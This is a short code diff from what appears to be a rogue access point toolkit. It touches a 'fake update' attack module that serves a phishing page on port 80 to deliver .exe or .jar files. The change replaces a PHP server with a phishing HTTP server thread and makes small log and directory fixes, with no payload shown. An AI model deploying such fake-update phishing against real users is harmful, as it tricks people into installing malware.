@@ -3,6 +3,7 @@ from shutil import copyfile
 from subprocess import Popen,PIPE,STDOUT
 from datetime import date
 from Core.loaders.Stealth.PackagesUI import *
+from Modules.servers.ServerHTTP import ThreadHTTPServerPhishing
 
 """
 Description:
@@ -125,6 +126,7 @@ class frm_update_attack(PumpkinModule):
 
     def stop_attack(self):
         for i in threadloading['server']:i.stop()
+        chdir(self.owd)
         threadloading['server'] = []
         self.removefiles()
         self.logBox.clear()
@@ -142,6 +144,7 @@ class frm_update_attack(PumpkinModule):
 
     def logPhising(self,log):
         self.logBox.addItem(log)
+        self.logBox.scrollToBottom()
 
 
     def SettingsPage(self,pathPage,directory,filename,info):
@@ -186,16 +189,11 @@ class frm_update_attack(PumpkinModule):
         except OSError,e:
             return QMessageBox.warning(self, "error directory",e)
         global threadloading
-        self.thphp = ThreadPopen(("php -S %s:80"%(ip)).split())
-        self.connect(self.thphp,SIGNAL("Activated ( QString ) "),self.logPhising)
-        threadloading['server'].append(self.thphp)
-        self.thphp.setObjectName("Server-PHP")
-        self.thphp.start()
+        self.threadHTTP = ThreadHTTPServerPhishing(80,directory)
+        self.threadHTTP.request.connect(self.logPhising)
+        threadloading['server'].append(self.threadHTTP)
+        self.threadHTTP.start()
         self.status.showMessage("::Started >> [HTTP::"+ip+" ::Port 80]")
-        while True:
-            if self.thphp.process != None:
-                chdir(self.owd)
-                break
 
     def getpath(self):
         files_types = "exe (*.exe);;jar (*.jar)"
